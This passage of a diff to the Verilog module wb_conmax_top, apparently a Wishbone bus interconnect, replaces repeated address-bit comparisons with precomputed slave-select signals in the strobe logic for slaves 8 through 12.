-    always @ (  ( ( ( s8_pri_sel == 2'd0 ) ) ? ( s8_arb_state ) : ( ( ( ( s8_msel_pri_sel == 2'd0 ) ) ? ( s8_msel_arb0_state ) : ( ( ( ( s8_msel_pri_sel == 2'd1 ) ) ? ( s8_msel_sel1 ) : ( s8_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd8 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd8 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd8 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd8 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd8 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd8 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd8 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd8 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s8_pri_sel == 2'd0 ) ) ? ( s8_arb_state ) : ( ( ( ( s8_msel_pri_sel == 2'd0 ) ) ? ( s8_msel_arb0_state ) : ( ( ( ( s8_msel_pri_sel == 2'd1 ) ) ? ( s8_msel_sel1 ) : ( s8_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd8 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd8 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd8 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd8 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd8 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd8 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd8 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd8 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s8_pri_sel == 2'd0 ) ) ? ( s8_arb_state ) : ( ( ( ( s8_msel_pri_sel == 2'd0 ) ) ? ( s8_msel_arb0_state ) : ( ( ( ( s8_msel_pri_sel == 2'd1 ) ) ? ( s8_msel_sel1 ) : ( s8_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s8_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd8 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s8_wb_stb_o = ( ( ( m0_slv_sel == 4'd8 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s8_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd8 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s8_wb_stb_o = ( ( ( m1_slv_sel == 4'd8 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s8_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd8 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s8_wb_stb_o = ( ( ( m2_slv_sel == 4'd8 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s8_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd8 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s8_wb_stb_o = ( ( ( m3_slv_sel == 4'd8 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s8_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd8 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s8_wb_stb_o = ( ( ( m4_slv_sel == 4'd8 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s8_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd8 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s8_wb_stb_o = ( ( ( m5_slv_sel == 4'd8 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s8_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd8 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s8_wb_stb_o = ( ( ( m6_slv_sel == 4'd8 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s8_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd8 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s8_wb_stb_o = ( ( ( m7_slv_sel == 4'd8 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -36319,40 +36391,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s9_pri_sel == 2'd0 ) ) ? ( s9_arb_state ) : ( ( ( ( s9_msel_pri_sel == 2'd0 ) ) ? ( s9_msel_arb0_state ) : ( ( ( ( s9_msel_pri_sel == 2'd1 ) ) ? ( s9_msel_sel1 ) : ( s9_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd9 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd9 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd9 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd9 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd9 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd9 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd9 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd9 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s9_pri_sel == 2'd0 ) ) ? ( s9_arb_state ) : ( ( ( ( s9_msel_pri_sel == 2'd0 ) ) ? ( s9_msel_arb0_state ) : ( ( ( ( s9_msel_pri_sel == 2'd1 ) ) ? ( s9_msel_sel1 ) : ( s9_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd9 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd9 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd9 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd9 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd9 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd9 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd9 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd9 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s9_pri_sel == 2'd0 ) ) ? ( s9_arb_state ) : ( ( ( ( s9_msel_pri_sel == 2'd0 ) ) ? ( s9_msel_arb0_state ) : ( ( ( ( s9_msel_pri_sel == 2'd1 ) ) ? ( s9_msel_sel1 ) : ( s9_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s9_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd9 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s9_wb_stb_o = ( ( ( m0_slv_sel == 4'd9 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s9_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd9 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s9_wb_stb_o = ( ( ( m1_slv_sel == 4'd9 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s9_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd9 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s9_wb_stb_o = ( ( ( m2_slv_sel == 4'd9 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s9_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd9 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s9_wb_stb_o = ( ( ( m3_slv_sel == 4'd9 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s9_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd9 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s9_wb_stb_o = ( ( ( m4_slv_sel == 4'd9 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s9_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd9 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s9_wb_stb_o = ( ( ( m5_slv_sel == 4'd9 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s9_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd9 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s9_wb_stb_o = ( ( ( m6_slv_sel == 4'd9 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s9_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd9 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s9_wb_stb_o = ( ( ( m7_slv_sel == 4'd9 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -39276,40 +39348,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s10_pri_sel == 2'd0 ) ) ? ( s10_arb_state ) : ( ( ( ( s10_msel_pri_sel == 2'd0 ) ) ? ( s10_msel_arb0_state ) : ( ( ( ( s10_msel_pri_sel == 2'd1 ) ) ? ( s10_msel_sel1 ) : ( s10_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd10 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd10 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd10 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd10 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd10 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd10 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd10 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd10 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s10_pri_sel == 2'd0 ) ) ? ( s10_arb_state ) : ( ( ( ( s10_msel_pri_sel == 2'd0 ) ) ? ( s10_msel_arb0_state ) : ( ( ( ( s10_msel_pri_sel == 2'd1 ) ) ? ( s10_msel_sel1 ) : ( s10_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd10 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd10 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd10 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd10 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd10 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd10 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd10 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd10 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s10_pri_sel == 2'd0 ) ) ? ( s10_arb_state ) : ( ( ( ( s10_msel_pri_sel == 2'd0 ) ) ? ( s10_msel_arb0_state ) : ( ( ( ( s10_msel_pri_sel == 2'd1 ) ) ? ( s10_msel_sel1 ) : ( s10_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s10_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd10 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s10_wb_stb_o = ( ( ( m0_slv_sel == 4'd10 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s10_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd10 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s10_wb_stb_o = ( ( ( m1_slv_sel == 4'd10 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s10_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd10 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s10_wb_stb_o = ( ( ( m2_slv_sel == 4'd10 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s10_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd10 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s10_wb_stb_o = ( ( ( m3_slv_sel == 4'd10 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s10_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd10 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s10_wb_stb_o = ( ( ( m4_slv_sel == 4'd10 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s10_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd10 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s10_wb_stb_o = ( ( ( m5_slv_sel == 4'd10 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s10_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd10 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s10_wb_stb_o = ( ( ( m6_slv_sel == 4'd10 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s10_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd10 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s10_wb_stb_o = ( ( ( m7_slv_sel == 4'd10 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -42233,40 +42305,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s11_pri_sel == 2'd0 ) ) ? ( s11_arb_state ) : ( ( ( ( s11_msel_pri_sel == 2'd0 ) ) ? ( s11_msel_arb0_state ) : ( ( ( ( s11_msel_pri_sel == 2'd1 ) ) ? ( s11_msel_sel1 ) : ( s11_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd11 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd11 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd11 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd11 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd11 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd11 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd11 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd11 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s11_pri_sel == 2'd0 ) ) ? ( s11_arb_state ) : ( ( ( ( s11_msel_pri_sel == 2'd0 ) ) ? ( s11_msel_arb0_state ) : ( ( ( ( s11_msel_pri_sel == 2'd1 ) ) ? ( s11_msel_sel1 ) : ( s11_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd11 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd11 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd11 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd11 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd11 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd11 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd11 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd11 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s11_pri_sel == 2'd0 ) ) ? ( s11_arb_state ) : ( ( ( ( s11_msel_pri_sel == 2'd0 ) ) ? ( s11_msel_arb0_state ) : ( ( ( ( s11_msel_pri_sel == 2'd1 ) ) ? ( s11_msel_sel1 ) : ( s11_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s11_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd11 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s11_wb_stb_o = ( ( ( m0_slv_sel == 4'd11 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s11_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd11 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s11_wb_stb_o = ( ( ( m1_slv_sel == 4'd11 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s11_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd11 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s11_wb_stb_o = ( ( ( m2_slv_sel == 4'd11 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s11_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd11 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s11_wb_stb_o = ( ( ( m3_slv_sel == 4'd11 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s11_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd11 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s11_wb_stb_o = ( ( ( m4_slv_sel == 4'd11 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s11_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd11 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s11_wb_stb_o = ( ( ( m5_slv_sel == 4'd11 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s11_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd11 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s11_wb_stb_o = ( ( ( m6_slv_sel == 4'd11 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s11_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd11 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s11_wb_stb_o = ( ( ( m7_slv_sel == 4'd11 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -45190,40 +45262,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s12_pri_sel == 2'd0 ) ) ? ( s12_arb_state ) : ( ( ( ( s12_msel_pri_sel == 2'd0 ) ) ? ( s12_msel_arb0_state ) : ( ( ( ( s12_msel_pri_sel == 2'd1 ) ) ? ( s12_msel_sel1 ) : ( s12_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd12 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd12 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd12 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd12 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd12 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd12 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd12 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd12 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s12_pri_sel == 2'd0 ) ) ? ( s12_arb_state ) : ( ( ( ( s12_msel_pri_sel == 2'd0 ) ) ? ( s12_msel_arb0_state ) : ( ( ( ( s12_msel_pri_sel == 2'd1 ) ) ? ( s12_msel_sel1 ) : ( s12_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd12 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd12 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd12 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd12 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd12 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd12 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd12 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd12 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s12_pri_sel == 2'd0 ) ) ? ( s12_arb_state ) : ( ( ( ( s12_msel_pri_sel == 2'd0 ) ) ? ( s12_msel_arb0_state ) : ( ( ( ( s12_msel_pri_sel == 2'd1 ) ) ? ( s12_msel_sel1 ) : ( s12_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s12_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd12 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s12_wb_stb_o = ( ( ( m0_slv_sel == 4'd12 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s12_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd12 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s12_wb_stb_o = ( ( ( m1_slv_sel == 4'd12 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s12_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd12 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s12_wb_stb_o = ( ( ( m2_slv_sel == 4'd12 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s12_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd12 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s12_wb_stb_o = ( ( ( m3_slv_sel == 4'd12 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s12_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd12 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s12_wb_stb_o = ( ( ( m4_slv_sel == 4'd12 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s12_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd12 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s12_wb_stb_o = ( ( ( m5_slv_sel == 4'd12 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s12_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd12 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s12_wb_stb_o = ( ( ( m6_slv_sel == 4'd12 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s12_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd12 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s12_wb_stb_o = ( ( ( m7_slv_sel == 4'd12 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -48147,40 +48219,40 @@ module wb_conmax_top(
         end
         endcase
     end
